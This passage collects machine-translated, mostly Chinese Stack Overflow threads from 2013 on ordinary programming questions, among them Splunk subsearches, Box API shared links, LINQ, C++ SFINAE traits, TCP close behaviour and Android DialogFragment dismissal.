    setTimeout('chatheartbeat();',2000);
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:47:29.913

通过简单的 ajax 和 php 开发实时聊天并不是要走的路。您必须使用 node.js 才能实现实时聊天系统。脸书正在使用它。

常规 ajax 和 php 的问题是您必须每 2 或 3 秒查询一次服务器以检查是否有可用的新数据，这会给服务器带来过多的负载。

Node.js 是要走的路。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-01T17:43:18.837

真的取决于您正在处理的用户数量以及您希望它快多少。发出从数据库中获取数据的 AJAX 请求通常被认为太过分了。您应该在一个呼叫和另一个呼叫之间*至少*间隔 5 秒，这显然取决于您的服务器速度和用户容量。

# apache - 如何以编程方式查询 Windows 上 Apache TomCat7 的当前内存设置？

> ID：15163489
> 
> 赞同：1
> 
> 时间：2013-03-01T17:31:01.907
> 
> 标签：apache, tomcat, chef-infra

我们使用 chef 来安装和配置我们的软件。

我想向 Tomcat 添加配置以更改内存设置。

如果我现在只是将这个添加到配置中，它会在每次运行时继续添加和添加。

根据这篇文章，您可以使用以下命令在命令行上执行此操作：

```
tomcat6 //US//Tomcat6 --JvmMx 1024 ++JvmOptions="-XX:MaxPermSize=256m" 
```

我们使用的是tomcat7，所以我们将其更改为：

```
tomcat7 //US//Tomcat7 --JvmMx 1024 ++JvmOptions="-XX:MaxPermSize=256m" 
```

有提到使用tomcat6 //ES/Tomcat6 进行查询。

我希望它将它输出到标准输出，但事实并非如此。

有没有什么地方可以以编程方式检查当前设置，所以我不会一次又一次地添加它。

潜在的答案不必是特定于厨师的，只要命令行就可以了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:35:30.417

The usual "programmatic" way to accomplish this would be via JMX, but since you said:

> just the command line

You can use reg.exe to get the Java parameters for the service that are stored in the Registry:

```
reg query "HKLM\Software\Apache Software Foundation\Procrun 2.0\<TOMCAT_SERVICE_NAME>\Parameters\Java" 
```

This will dump all the Java parameters, and in your case, you're looking for "JvmMx".

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-09-26T16:27:23.303

在 commons-procrun v1.2.3 中，列表中添加了一个[新命令](https://issues.apache.org/jira/browse/DAEMON-422)：print-config

你可以像这样运行它：

```
tomcat7 //PS//Tomcat7 
```

它会为您转储现有的配置。

这是在 Tomcat 7.0.106 中添加的，Tomcat 8.5 和 Tomcat 9.0 的下一个版本在下一次发布时也应该有它。（后向端口已完成；等待发布。）

# xamarin-studio - “找不到符号：__FastDevLauncher”阻止部署到 Android 模拟器

> ID：15163492
> 
> 赞同：0
> 
> 时间：2013-03-01T17:31:13.883
> 
> 标签：xamarin-studio, xamarin.android

我正在使用 Xamarin Studio 和 MonoGame 将 Windows Phone 应用程序移植到 Android。

设置非常顺利，但是当我尝试将项目部署到模拟器时，出现以下错误：

* * *

```
C:\Users\croberts\Documents\Visual Studio 2010\Projects\Shelter_Port\Shelter_Android\Shelter_Android\obj\Debug\android\src\mono\TrialSplashScreen60e2a7ae51784c7983049dbf7b06b10c.java(101,101): Error:  cannot find symbol

symbol  : class __FastDevLauncher

location: package mono.android

Intent intent = new Intent (TrialSplashScreen60e2a7ae51784c7983049dbf7b06b10c.this, mono.android.__FastDevLauncher.class); 
```

* * *

当谷歌搜索提到 __FastDevLauncher 类时，我找不到任何东西，而 TrialSplashScreen#####.java 表明这可能与我使用 Xamarin 的 30 天试用版有关？

无论如何，我不知道从哪里开始寻找修复，因为它不是我的代码中直接引用的任何东西。

提前感谢您的帮助。

克里斯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-02T16:37:06.250

从源代码构建 MonoGame 库可解决此问题。Xamarin 2.0 版本和 MonoGame 3.0.0.0 版本之间似乎存在链接错误。我下载了 MonoGame 的最新稳定源代码，并在我自己的源代码旁边构建了库，构建错误消失了。

# splunk - 使用另一个 splunk 查询的结果过滤 splunk 结果

> ID：15163497
> 
> 赞同：4
> 
> 时间：2013-03-01T17:31:29.303
> 
> 标签：splunk

我想在 splunk 中使用查询，提取字段列表，然后使用这些结果字段进一步过滤我后续的 splunk 查询。我该怎么做呢？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-04-17T19:11:31.017

FORMAT 命令对此特别有用。这是一个过于简单的示例，但应该让您了解它的使用方式：

首先，制作您的子搜索，它将为您提供您关心的领域。这是一个功能示例：

```
|metadata type=hosts index=_internal | table host | format 
```

尝试自行运行此搜索以查看输出的样子。

然后我们只需将其添加为您的实际搜索的子搜索：

```
index=foo sourcetype=bar [|metadata type=hosts index=_internal | table host | format] 
```

这将为您提供来自索引 foo、sourcetype bar 和来自子搜索的每个主机的事件。

这实际上是一个非常强大的命令，因为您可以使用它来动态设置时间范围以及复杂的布尔过滤器。

[更多 FORMAT 文档可以在这里找到](http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/format)

[使用 FORMAT 可以完成的更复杂的示例](http://splunk-base.splunk.com/answers/9940/search-for-events-that-happened-around-the-time-of-other-events-that-also-meet-other-criteria)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-07T16:01:38.247

一种选择是将数据从第一次搜索传递到下一次搜索，然后您可以进一步过滤结果。希望以下简化的搜索字符串可以为您提供有关如何执行此操作的想法...

```
index=_internal  | head 100  | fields host, sourcetype, source | search sourcetype="splunkd_access" 
```

有关更多信息，我建议阅读[Splunk 搜索参考](http://docs.splunk.com/Documentation/Splunk/latest/SearchReference/WhatsInThisManual)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2020-05-22T07:52:18.557

在 Splunk 中，可以对第一个 splunk 查询的结果进行过滤/处理，然后进一步过滤/处理结果以获得所需的输出。

这是 Splunk 最强大的功能，而 Kibana、Tableau 等其他可视化工具所缺乏的。

假设您在索引中有数据`foo`并提取名称、地址等字段。

现在名称/地址可以是直接键值对，或者您需要使用正则表达式或 Splunk 内置功能**提取字段**从事件中提取。

然后使用 name = "John" 等值进一步过滤，然后 Splunk 搜索将是：

```
index="foo" | table name, address | where name="John" 
```

# json - 盒子api。File对象中共享链接结构的用途是什么

> ID：15163498
> 
> 赞同：1
> 
> 时间：2013-03-01T17:31:30.330
> 
> 标签：json, api, box-api

File 对象中共享链接结构的用途是什么？

```
"shared_link": {
    "url": "https://www.box.com/s/rh935iit6ewrmw0unyul",
    "download_url": "https://www.box.com/shared/static/rh935iit6ewrmw0unyul.jpeg",
    "vanity_url": null,
    "is_password_enabled": false,
    "unshared_at": null,
    "download_count": 0,
    "preview_count": 0,
    "access": "open",
    "permissions": {
        "can_download": true,
        "can_preview": true
    }
} 
```

我想了解什么是**url**和**download_url**字段，当我尝试获取它们时，我分别得到 404 和 403。如何使用**download_url**和**url**？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T18:30:54.077

共享链接有两个目的：

首先，如果权限设置为允许，您可以浏览到 URL 并访问内容。（我无法浏览到您提供的那些，所以我假设它已被禁用？）

其次，您可以通过 API 访问当前访问令牌不可用的资源。我有一个带有 id`3954425794`和共享链接 url 的文件`https://www.box.com/s/amilne3xg32auzk9vqga`。使用`/shared_items`端点（[文档](http://developers.box.com/docs/#shared-items-get-a-shared-item)）和共享链接，您可以访问有关该文件的信息。

> 要求：
> 
> ```
> curl https://api.box.com/2.0/shared_items
> -H "Authorization: Bearer YOUR_ACCESS_CODE"
> -H "BoxApi: shared_link=https://www.box.com/s/amilne3xg32auzk9vqga" 
> ```
> 
> 回复：
> 
> ```
> { "type":"file", "id":"3954425794", "name":"shared file.txt" } 
> ```

如果您尝试使用正常`GET /files/{id}`方法访问此文件，则会失败并显示 404：

> 要求：
> 
> ```
> curl https://api.box.com/2.0/files/3954425794
> -H "Authorization: Bearer YOUR_ACCESS_CODE" 
> ```
> 
> 回复：
> 
> ```
> HTTP/1.1 404 Not Found 
> ```

# c# - 使用 Linq 查看是否有任何一个子记录具有特定值

> ID：15163500
> 
> 赞同：0
> 
> 时间：2013-03-01T17:31:33.690
> 
> 标签：c#, linq, linq-to-entities

我有一组使用外键链接的表，如下所示

```
A 1----* B 
```

也就是说，A 可以有许多 B 记录。

如果将某个标志传递给我的函数，我需要添加一个“where”子句来返回 B.isMax == true 的所有 A 记录。我不知道如何处理这个。

```
public List<A> GetA(int AID, string AName, bool? isActive, bool? isMax)
    {
        var q = from a in Context.A
                select a;

        if (AID > 0)
        {
            q = q.Where(c => c.AID == AID);
        }

        if (!string.IsNullOrEmpty(AName))
        {
            q = q.Where(c => c.Name.Contains(AName));
        }

        if (isActive != null)
        {
            q = q.Where(c => c.IsActive == isActive);
        }

        if (isMax != null)
        {
            // ???? Can't do this. How can I implement this kind of thing??
            q = q.Where(c => c.B.IsMax == isMax);
        }

        List<A> ret = q.ToList();

        return ret;
    } 
```

有什么想法吗？？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T17:32:57.697

您可以使用[`Any`](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.any.aspx)：

```
q = q.Where(c => c.B.Any(i => i.IsMax == isMax)); 
```

`Any`用于检查序列的任何元素是否满足条件

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:33:33.653

你的意思是`Any`？

```
q = q.Where(c => c.B.Any(b => b.IsMax == isMax)); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-01T17:48:06.857

你觉得，做这样的事情是个好主意吗？

```
public List<A> GetA(int AID, string AName, bool? isActive, bool? isMax)
{
    return Context.A
            .Where(c =>
                       (AID <= 0 || c.AID == AID)
                    && (string.IsNullOrEmpty(AName) || c.Name.Contains(AName))
                    && (isActive == null || c.IsActive == isActive)
                    && (isMax == null || c.B.Any(b => IsMax == isMax))
                  )
            .ToList();
} 
```

# excel - 搜索变量并从中复制粘贴一个偏移单元格

> ID：15163502
> 
> 赞同：0
> 
> 时间：2013-03-01T17:31:45.933
> 
> 标签：excel, vba

**您好，提前感谢您的帮助！我将在接下来的几行中提出我的问题：**

**1.**我在Sheet1中有一个一百个关键词的列表。

**2.**对于其中的每一个，我必须找到它，如果它存在于 Sheet2 的列表中。

**3.**如果不是，则必须进行下一个关键字。

**4.**如果它存在，它应该复制从找到的单元格到左边三个位置的单元格。

**5.**并将Sheet1粘贴到关键字的右侧。

```
Sub Alaba()

Dim x As Object
Dim y As Variant
Dim z As Variant

Sheets("#CoT.military refresh").Activate
Range("c3").Select

Do
ActiveCell.Offset(0, -1).Select

Set x = ActiveCell

Sheets("Copy of CoT HQ").Select
Columns("E:E").Select
Selection.Find(What:=x, After:=ActiveCell, LookIn:=xlFormulas, _
LookAt:=xlPart, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
MatchCase:=False, SearchFormat:=False).Activate

Set y = ActiveCell

If Not y Is Nothing Then
y.Offset(0, -3).Copy
Sheets("#CoT.military refresh").Activate
Selection.Find(What:=x, After:=ActiveCell, LookIn:=xlFormulas, _
LookAt:=xlPart, SearchOrder:=xlByRows, SearchDirection:=xlNext, _
MatchCase:=False, SearchFormat:=False).Activate
ActiveCell.Offset(0, 1).Select
ActiveCell.Paste
ActiveCell.Offset(1, 0).Activate

End If

Loop Until x = "a"

End Sub 
```

这是我到目前为止提出的代码，但它在这一行给了我一个错误：

```
ActiveCell.Paste 
```

如果您能帮助我找到解决问题的方法，我将非常高兴。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-19T07:32:28.193

您是否检查过 Selection.Find 是否给您一个错误？在这种情况下，您可以看到[http://www.cpearson.com/excel/errorhandling.htm](http://www.cpearson.com/excel/errorhandling.htm)，这是一个很好的页面来解释这一点。

您也可能遇到组合单元格的问题（但我认为这不是您的问题，不是吗？

如果我是你，我不会使用 OffSet，因为我更清楚这一点：

```
dim row as integer
 row=Selection.Row
row=row-3
Cells(row,5).Select
Selection.Copy
'Column 5 is E 
```

希望它可以帮助你

# php - 要使用哪种方法？

> ID：15163504
> 
> 赞同：0
> 
> 时间：2013-03-01T17:31:55.737
> 
> 标签：php, url, post, get

我在网站上有表格，用于搜索数据库中的对象。问题是用户可以搜索许多属性，所以我不确定我应该使用 POST 方法将值传递给其他脚本，还是应该将所有变量放在 URL 中并使其他脚本独立且仅可访问关联。

例如，如果我使用 GET 方法，URL 将如下所示：

/.../searching_objects.php?a[priority][gym]=0&a[priority][clubs]=1&a[priority][shop]=1&a[priority][restaurants]=1&a[priority][pubs]=0&a [priority][pets]=1&a[priority][parking]=0&a[persons]=1&a[lat]=nondef&a[lng]=nondef&a[radius]=500&a[college]=0

*   在这种情况下，我的页面将独立于前一个页面，它可以被刷新，或者不依赖于以前的脚本来访问

但如果我使用 POST 方法，我的 URL 看起来像 /.../searching_objects.php，或者可能有几个变量通过 URL，用于切换页面。这种方法显然取决于以前的脚本。

根据这个问题，哪种方法更好？哪一个对用户更友好（在这些情况下是否优先考虑用户友好？）？是否有一些安全原因为什么更喜欢一种方法而不是另一种方法？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:35:12.080

You should go with GET because POST is meant to *post* / *create* things from a form (like an article). A search box is usually considered to be just a tool to forge the correct GET url. Also people usually want to save specific searches just by copy and pasting an URL (just look at how Google managed it).

None of them is really user friendly. And you should just don't care about it. Search urls are never really user friendly.

If you secure all the inputs (like you always should) you shouldn't worry about security. Particularly in the search context there isn't that much security checks going on, you just have to fetch data from the database and print it. Just remember of SQL Injections (and XSS on the printing side) and you should be fine.

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:40:19.387

首先，使用 GET。您正在获取数据，而不是发布数据。POST 应该用于**更改服务器上某些内容的**操作。

对于长 URL 问题，您可以做一些事情：

*   分离您的搜索页面 - 为不同的搜索类型提供不同的搜索页面。
*   使用 URL 重写 - 利用`.htaccess`并将`ModRewrite`一个很长的 URL 更改为更短、更漂亮的 URL。

此外，您可能需要重新考虑如何布置搜索项（不是在可视性方面，而是在数据管理方面）。考虑发布一个不同的问题，解释您如何布置当前的搜索输入，以及如何改进它。

# c# - WPF中不存在ValidationSummary？

> ID：15163505
> 
> 赞同：1
> 
> 时间：2013-03-01T17:31:56.213
> 
> 标签：c#, wpf

我正在尝试设置 WPF DataGrid 的样式。我将控制模板从[这里](http://msdn.microsoft.com/en-us/library/cc278066%28v=vs.95%29.aspx)复制到资源字典中。我无法编译它，因为它说，

“XML 命名空间中不存在 ValidationSummary”

我的项目中引用了所有 PresentationCore 和 PresentationFramework 程序集。

我想我可能需要“System.Windows.Controls.Data.Input.dll”，但我找不到它。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:39:04.017

我认为这是[Silverlight Toolkit](http://silverlight.codeplex.com/)的一部分。您不能在 WPF 中使用它。您必须找到同一类的 WPF 计数器部分。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T17:56:58.983

您所指的页面适用于，`Silverlight`但如果您想要自定义样式和模板，请参阅[此处](http://msdn.microsoft.com/en-us/library/ff506248.aspx)`WPF`的链接。

# javascript - 如何在 JSON 中使用占位符

> ID：15163506
> 
> 赞同：1
> 
> 时间：2013-03-01T17:31:56.433
> 
> 标签：javascript, jquery, json

有没有办法在 JSON 中使用类似于 Java 属性文件的占位符？

我想用下面显示的 JSON 字符串替换以下属性值。如果可以使用占位符，我将如何使用 JS 或 JQuery 动态替换占位符？如果可以在不使用 Regex 匹配和替换的情况下完成此操作，那就太好了。

```
WelcomeMessage=Welcome {0}
GoodBye=Goodbye,{0}. Thank you for visiting {1} 
```

JSON字符串

```
 { "messages" : {
                  "WelcomeMessage":"Welcome {name}",
                  "GoodBye":"Goodbye,{name}. Thank you for visiting {siteName}"
                 }
    } 
```

谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:39:57.757

这应该可以解决您的问题：

```
// Your messages
var message = {
    'welcome': 'Welcome {name}'
} ;

// Your variables
var vars= {
    'name': 'user'
};

var placeholders = function ( message, variables ) {
    for ( var v in variables ) {
        message = message.replace( '{'+v+'}' , variables[v] );
    }

    return message;
} ;

alert ( placeholders(message['welcome'], vars) );
// Alert: Welcome user 
```

# php - 垂直翻转文本保留文本的大小写

> ID：15163508
> 
> 赞同：0
> 
> 时间：2013-03-01T17:32:03.113
> 
> 标签：php, javascript

有没有办法使用javascript/php而不是css来垂直翻转文本以保持它们的大小写敏感度，因为我也想支持旧浏览器。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T17:49:01.823

我认为您不需要依赖 JS 或 PHP 来支持旧浏览器（除非您指的是*真正*的旧浏览器，例如 IE4 或其他东西，然后 JS 支持会很糟糕，这可能对您也无济于事）。

Internet Explorer 5.5+ 有一个过滤器`Rotation`，可以满足您的需求。

[http://msdn.microsoft.com/en-us/library/bb554293(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/bb554293(v=vs.85).aspx)

[资源](https://stackoverflow.com/questions/13513921/css3-transform-rotatey180deg-ie-fallback)

# c++ - 如何检查成员运算符（类型）？

> ID：15163512
> 
> 赞同：3
> 
> 时间：2013-03-01T17:32:09.960
> 
> 标签：c++, templates, c++11, sfinae

假设我有类型`bar`和`foo`. 我如何构造一个模板类`has_call_with_arg<>`，`has_call_with_arg<bar,foo>::value`当且仅当

```
bar b;
foo f;
b(f); 
```

会编译吗？我调查了各种相关问题（*包括上面提到的*）并尝试了

```
template<typename Func, typename Arg>
class has_call_with_arg
{
  struct bad {};
  struct test : Func
  {
    template<typename C>
    bad operator()(C const&r);
  };
public:
  static const bool value = 
    !std::is_same<bad, typename std::result_of<test(Arg const&)>::type >::value;
}; 
```

但这不起作用（没有检测到正确的匹配）。怎么了？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-01T18:11:40.273

```
template<typename sig, typename functor> struct is_callable;
template<typename Ret, typename... Arg, typename functor> 
struct is_callable<Ret(Arg...), functor> { // partial spec
private:
    struct no {};
public:
    template<typename U> static auto f(std::nullptr_t) -> decltype(std::declval<U>()(std::declval<Arg>()...));
    template<typename U> static no f(...);
    static const int value = std::is_convertible<decltype(f<functor>(nullptr)), Ret>::value;
}; 
```

[我为我的教程](http://codepuppy.co.uk/cpptuts/TMP/SFINAE.aspx)创建了这个内容，它解释了这个特征的构造（首先是非可变形式）。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T18:18:33.070

`std::result_of<test(Arg const&)>`提供一个模板参数，它是一个函数类型，它引用`Arg const`并返回一个`test`. 所以它`type`不是`test`很有帮助。

请注意，正如所写，需要代码

```
bar b;
foo f;
b(f); 
```

要有效实际上是 5 个要求： `bar`并且`foo`每个都有一个可访问的默认构造函数和析构函数，并且`b(f)`是一个有效的表达式。我将只关注最后一个（这可能就是你的意思）。如果您确实是指其他部分，则可以使用标准`<type_traits>`属性添加这些部分。

该函数`std::declval`非常适合假装您拥有给定类型的对象，即使您没有。它永远不能被调用，所以它通常只在`decltype`表达式中使用。

有两种实现 SFINAE 技巧的基本方法，基于 C++ 允许模板参数推导失败的两个地方，以丢弃失败的声明：

首先，尝试匹配一个类的偏特化：

```
template<typename Func, typename Arg, typename Enable = void>
struct has_call_with_arg1 : public std::false_type {};

template<typename Func, typename Arg>
struct has_call_with_arg1<Func, Arg,
    decltype(std::declval<Func&>()(std::declval<Arg&>()))>
    : public std::true_type {}; 
```

其次，当至少一个重载是函数模板时，重载决议。（类模板的非模板成员函数在这里不起作用，因为实例化类需要每个成员声明都有效。）

```
namespace has_call_with_arg_impl {
    template<typename F, typename A>
    std::true_type test(decltype(std::declval<F&>()(std::declval<A&>()))*);

    template<typename F, typename A>
    std::false_type test(...);
}

template <typename Func, typename Arg>
struct has_call_with_arg2
    : public decltype(has_call_with_arg_impl::test<Func,Arg>(nullptr)) {}; 
```

演示：http: [//ideone.com/KgRI8y](http://ideone.com/KgRI8y)

# tcp - 什么可能导致主动 TCP 关闭返回而不通知被动端？

> ID：15163513
> 
> 赞同：0
> 
> 时间：2013-03-01T17:32:14.513
> 
> 标签：tcp, rpc

我对使用 TCP 的应用程序的行为感到困惑。当 Internet 范围的 TCP 连接一端的应用程序在套接字上调用 close() 时，close() 返回。然而，在另一端，套接字上的 write() 并不表示 TCP 连接已关闭。AFAIK，这种行为与 TCP 规范不一致：主动 close() 不应该返回，除非它收到来自 TCP 连接另一端的确认（具体来说，主动端的 TCP 状态不能转换出来TIME_WAIT_1 除非它从另一端收到适当的响应——此时另一端的 write() 应该返回错误）。

当故障入侵防御系统 (IPS) 在 TCP 连接的两端之间时，我已经看到了这种行为。IPS 的制造商正在解决这个问题。

是否还有其他可能发生此行为的情况？

我的环境是 Unix、C、ONC RPC 和套接字。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T21:37:28.507

您将协议状态转换和 API 行为混为一谈。RFC 中没有任何内容表明 close() API 不能返回到应用程序并且协议操作异步进行，而这正是 Sockets API 默认情况下发生的情况。如果在套接字发送缓冲区中有待发送的数据并且接收器很慢，则发送 FIN 可能需要任意时间。您可以通过使用套接字选项 SO_LINGER 设置延迟超时来更改它，这会导致 close 阻塞，直到所有数据都被刷新或超时到期，但它在实践中几乎从未使用过。

# asp.net - 通过 ListTextField 过滤 GridDropDownColumn

> ID：15163518
> 
> 赞同：0
> 
> 时间：2013-03-01T17:32:22.860
> 
> 标签：asp.net, telerik, radgrid

我实现了第一个解决方案： [Filtering By ListTextField for GridDropDownColumn](http://www.telerik.com/help/aspnet-ajax/grid-filtering-by-listtextfield-for-griddropdowncolumn.html)

我的代码是：
ASPX

```
<telerik:GridDropDownColumn DataSourceID="SqlDataSource2"  ListTextField="NM_COMUNIDADE" ListValueField="ID_COMUNIDADE"  UniqueName="NM_COMUNIDADE_COLUNA" SortExpression="NM_COMUNIDADE" HeaderText="Comunidade" 
DataField="ID_COMUNIDADE"DropDownControlType="RadComboBox" FooterText="" AllowAutomaticLoadOnDemand="false" AutoPostBackOnFilter="true" CurrentFilterFunction="StartsWith" AllowVirtualScrolling="true" 
ShowMoreResultsBox="true" ItemsPerRequest="10" FilterControlWidth="100%" ShowFilterIcon="false" ColumnEditorID="NM_COMUNIDADE_EDITOR">
</telerik:GridDropDownColumn>

<telerik:GridBoundColumn DataField="NM_COMUNIDADE" HeaderText="NM_COMUNIDADE" SortExpression="NM_COMUNIDADE" UniqueName="NM_COMUNIDADE" Display="false" ReadOnly="true"></telerik:GridBoundColumn> 
```

C＃

```
protected void gridCultos_ItemCommand(object source, GridCommandEventArgs e)
{
    if (e.CommandName == RadGrid.FilterCommandName)
    {
        Pair command = (Pair)e.CommandArgument;
        if (command.Second.ToString() == "NM_COMUNIDADE_COLUNA")
        {
            e.Canceled = true;
            GridFilteringItem filter = (GridFilteringItem)e.Item;
            ((filter["NM_COMUNIDADE"].Controls[0]) as TextBox).Text = ((filter["NM_COMUNIDADE_COLUNA"].Controls[0]) as TextBox).Text;
            command.Second = "NM_COMUNIDADE";
            filter.FireCommandEvent("Filter", new Pair(command.First, "NM_COMUNIDADE")); 
        }
    }
}
protected void gridCultos_ItemDataBound(object sender, GridItemEventArgs e)
{
    if (e.Item is GridFilteringItem)
    {
        GridFilteringItem item = e.Item as GridFilteringItem;
        ((item["NM_COMUNIDADE_COLUNA"].Controls[0]) as TextBox).Text = ((item["NM_COMUNIDADE"].Controls[0]) as TextBox).Text;
    }
} 
```

**过滤器仅在第一次使用过滤器功能“StartsWith”时才起作用，之后似乎将过滤器功能更改为“EqualTo”。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-06T13:58:54.527

问题出在 ASPX 中：

```
<telerik:GridDropDownColumn UniqueName="CategoryddColumn" ListTextField="EmployeeID"
    HeaderText="Category name" ListValueField="OrderID" DataField="OrderID" DataSourceID="SqlDataSource1"
    AllowVirtualScrolling="true" ShowMoreResultsBox="true" DataType="System.String"
    ItemsPerRequest="10" FilterControlWidth="100%" ShowFilterIcon="false" FooterText=""
    AllowAutomaticLoadOnDemand="false" AutoPostBackOnFilter="true">
</telerik:GridDropDownColumn>
<telerik:GridBoundColumn DataField="EmployeeID" UniqueName="EmployeeID" Display="false">
</telerik:GridBoundColumn> 
```

解决方案是为 GridDropDownColumn 设置 DataType="System.String" 并删除 CurrentFilterFunction="StartsWith"。过滤器将与过滤器功能“包含”一起使用，但没关系。

# php - php中的组复选框并发送到电子邮件

> ID：15163519
> 
> 赞同：0
> 
> 时间：2013-03-01T17:32:28.133
> 
> 标签：php

我正在使用来自[http://www.html-form-guide.com/contact-form/php-contact-form-tutorial.html](http://www.html-form-guide.com/contact-form/php-contact-form-tutorial.html)的示例 php conatct 表单，我想在我的表单中使用复选框，但我是在我的电子邮件中只收到最后检查的一封。我发现我应该将数组用于复选框，例如：

```
input type="checkbox" name="chk_group[]" value="value1" />Value 1<br />
input type="checkbox" name="chk_group[]" value="value2" />Value 2<br />
input type="checkbox" name="chk_group[]" value="value3" />Value 3<br /> 
```

我应该在我的代码中的某个地方使用以下循环：

```
<?php
if (isset($_POST['chk_group'])) {
    $optionArray = $_POST['chk_group'];
    for ($i=0; $i'<'count($optionArray); $i++) {
        echo $optionArray[$i]."<br />";
    }
}
?> 
```

不幸的是，我尝试了，但是因为我使用的示例联系表对我来说有点奇怪，所以我遇到了错误。

如果有人可以帮助我解决这个问题，我将不胜感激。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T17:38:49.957

删除 . 周围的单引号`<`。它应该是：

```
for ($i=0; $i<count($optionArray); $i++) { 
```

您也可以`for`用[foreach](http://php.net/foreach)循环替换循环：

```
foreach($optionArray as $element) {
    echo $element."<br />";
} 
```

# android - DialogFragment 关闭事件

> ID：15163520
> 
> 赞同：12
> 
> 时间：2013-03-01T17:32:38.273
> 
> 标签：android, android-dialogfragment

我需要处理 DialogFragment 的结束（在调用 .dismiss 之后） - 例如，我会在关闭后“包含”片段的活动中显示一个 toast。

我该如何处理事件？

* * *

## 回答 #1

> 赞同：25
> 
> 时间：2013-03-01T17:39:13.140

`onDismiss()`在您的 DialogFragment 中覆盖，或`setOnDismissListener()`在您正在构建片段的代码块中使用。

* * *

## 回答 #2

> 赞同：16
> 
> 时间：2015-07-12T10:17:25.080

我遇到了类似的问题，但我想通知另一个有关对话框关闭的活动（而不是创建和显示对话框的活动）。

尽管您可以`onDismiss()`按照 Austyn Mahoney 的建议覆盖 DialogFragment 中的方法，但您**不能**使用`setOnDismissListener()`，因为 DialogFragment 根本不提供这种方法（根据：[Android Developers DialogFragment Reference](http://developer.android.com/reference/android/app/DialogFragment.html)）。

**但是还有另一种很好的方法可以通知任何其他有关对话框的活动dismiss**，（我在那里找到了它：[DialogFragment 和 onDismiss](https://stackoverflow.com/questions/23786033/dialogfragment-and-ondismiss)），它来了：

首先，您应该使您的活动（您要传递有关对话框关闭信息的活动）实现`OnDismissListener`：

```
public final class YourActivity extends Activity implements DialogInterface.OnDismissListener {

    @Override
    public void onDismiss(final DialogInterface dialog) {
        //Fragment dialog had been dismissed
    }

} 
```

再次根据[Android Developers DialogFragment Reference](http://developer.android.com/reference/android/app/DialogFragment.html) DialogFragment 已经实现`OnDismissListener`了 with`onDismiss()`方法。这就是为什么你应该覆盖它并在那里调用`onDismiss()`你在 YourActivity 中实现的方法：

```
public final class DialogFragmentImage extends DialogFragment {

    @Override
    public void onDismiss(final DialogInterface dialog) {
        super.onDismiss(dialog);
        final Activity activity = getActivity();
        if (activity instanceof DialogInterface.OnDismissListener) {
            ((DialogInterface.OnDismissListener) activity).onDismiss(dialog);
        }
    }

} 
```

# javascript - 使用 Javascript 检查元素宽度

> ID：15163521
> 
> 赞同：-1
> 
> 时间：2013-03-01T17:32:38.500
> 
> 标签：javascript, jquery, html

我正在使用某人做过的网站，并且我在使用 javascript 时遇到了一些困难。

我正在尝试获取 div 的当前宽度，而不是 CSS 中的宽度。当我调整窗口大小时，我需要获取新的 div 宽度（通过 jQuery 调整大小）。

我正在使用这段代码：

```
if(document.getElementById("header").offsetWidth<1270){
    alert("Cheguei aqui");
} 
```

我认为如果元素宽度低于 1270，我会发送警报。但它不起作用。

这是标题 div。

```
 <div id="header">
            <div class="container">
      <div class="two columns" id="logo-wrap"> <a href="index.html">
        <div id="logo2"></div>
        </a>
         <select id="header-mobile-menu">
          <option value="index.html">Home</option>
          <option value="Quem Somos.html">Quem Somos</option>
          <option value="Consulta.html">Consultas</option>
          <option value="Exame.html">Exames</option>
          <option value="Terapias.html">Terapias Alternativas</option>
          <option value="AcaoSocial.html">Ação Social</option>
          <option value="Contato.html">Contato </option>
        </select>
      </div>
      <div class="fourteen columns">
        <nav>
          <ul id="menu-header-menu" class="menu">
            <li><a href="index.html">Home</a></li>
            <li><a href="Quem Somos.html">Quem Somos</a></li>
            <li><a href="Consulta.html">Consultas</a></li>
            <li><a href="Exame.html">Exames</a></li>
            <li><a href="Parceiros.html">Parceiros</a></li>
            <li><a href="Contato.html">Contato</a> </li>
          </ul>
        </nav>  
      </div>
<!-- Place this tag where you want the search box to render -->
<div class="searchgoogle"><gcse:searchbox-only></gcse:searchbox-only></div>

      <br class="clear" />
    </div>
<div id="socialdiv">
    <div id="social-button"> 
            <a href="http://www.facebook.com/centralife" target="_blank">
            <div id="facebook-img"></div></a>
            <a href="https://twitter.com/CentralLife1" target="_blank">
            <div id="twitter-img"></div></a>    
        <a href="http://www.orkut.com.br/Main#Profile?uid=9858410708954250541" target="_blank">
            <div id="orkut-img"></div></a>    
            <a href="http://centralifesaude.blogspot.com.br/" target="_blank">
            <div id="blog-img"></div></a>
            <a href="http://www.youtube.com/watch?v=0Uhjl-ykpt8&feature=plcp" target="_blank">
            <div id="youtube-img"></div></a>
           </div>
</div>
</div> 
```

CSS 有很多“标题”声明，很难得到它们。顺便说一句，这个 javascript 不会影响我的 CSS，是吗？

怎么了？

* * *

## 回答 #1

